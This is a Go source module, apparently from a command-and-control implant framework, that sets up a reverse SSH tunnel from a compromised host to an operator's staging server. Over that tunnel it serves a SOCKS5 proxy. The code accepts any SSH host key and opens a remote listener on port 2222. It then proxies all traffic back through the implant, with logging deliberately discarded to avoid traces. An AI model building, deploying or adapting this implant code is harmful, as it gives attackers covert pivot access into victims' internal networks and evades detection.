// +build linux darwin windows


package biterpreter

import (
	
	"io"
	"net"
	"golang.org/x/crypto/ssh"
	"github.com/armon/go-socks5"
	"time"
	"encoding/json"
	//"fmt"
	"log"
	"io/ioutil"
)

/* JSON struct already declared in revSSHSHELL module
This JSON Object definition is needed in some Implants Modules to decode parameters
Hive will have the same definitions in: ./src/hive/hiveJobs.go

type InjectRevSshShellBichito struct {
    Domain string   `json:"domain"`
    Sshkey string   `json:"sshkey"`
    Port string   `json:"port"`
    User string   `json:"user"`
    //Socks5Port string   `json:"socks5port"` //This is the SOCKS5 port that will be opened in the implant device
}
*/

/*
Description: Inject Reverse Socks5 
Flow:
A.Use golang ssh native library to spawn a ssh client that connects to a target staging
	A1.Use provided credentials (username and pem key), for the ssh connection
B.This connection will create a listener in 2222 localport of target staging
C.Open a SOCKS5 socket in bichito, then any remote receiving connection (remote SSH listen socket) will be TCP redireced to SOCKS5 
*/
func RevSshSocks5(jsonparams string) (bool,string){

	//Debug
	//fmt.Println(jsonparams)

	var revsshshellparams *InjectRevSshShellBichito
	errDaws := json.Unmarshal([]byte(jsonparams),&revsshshellparams)
	if errDaws != nil {
		return true,"Parameters JSON Decoding error:"+errDaws.Error()
	}

	auth, err := loadPrivateKey(revsshshellparams.Sshkey)
	if err != nil {
		return true,"Load Key String error"
	}

	config := &ssh.ClientConfig{
		User: revsshshellparams.User,
		Auth: nil,
	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
            return nil
        },
        Timeout:time.Second * 1,
	}

	config.Auth = append(config.Auth, auth)

	// Dial the SSH connection
	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":"+revsshshellparams.Port, config)
	if err != nil {
		return true,"Error: error dialing remote host:"+err.Error()
	}


	// Listen on remote
	l, err := sshConn.Listen("tcp", "127.0.0.1:2222")
	if err != nil {
		return true,"Error: error listening on remote host:"+err.Error()
	}

	go listenSSHSocks5(sshConn,l)//,revsshshellparams.Socks5Port)

	return false,"Success: Rev SSH Socks5 Connected to Staging"
}


func listenSSHSocks5(sshconn *ssh.Client,l net.Listener){//,socks5port string){

	defer sshconn.Close()

	//Make sure SOCKS5 don't log stuff
	logger := log.New(ioutil.Discard, "", log.LstdFlags)
	conf := &socks5.Config{Logger:logger}
	//conf := &socks5.Config{}
	server, err := socks5.New(conf)
	if err != nil {
  		return
	}

	// Start accepting shell connections
	for {
		
		conn, err := l.Accept()
		if err != nil {
			//continue
			return
		}

		go server.ServeConn(conn)

	}
}


func redirectTCP(client net.Conn, remote net.Conn) {
	defer client.Close()
	chDone := make(chan bool)

	// Start remote -> local data transfer
	go func() {
		defer client.Close()
		defer remote.Close()

		_, err := io.Copy(client, remote)
		if err != nil {
			//log.Println(fmt.Sprintf("error while copy remote->local: %s", err))
		}
		chDone <- true
	}()


	// Start local -> remote data transfer
	go func() {
		defer client.Close()
		defer remote.Close()

		_, err := io.Copy(remote, client)
		if err != nil {
			//log.Println(fmt.Sprintf("error while copy local->remote: %s", err))
		}
		chDone <- true
	}()


	<-chDone

}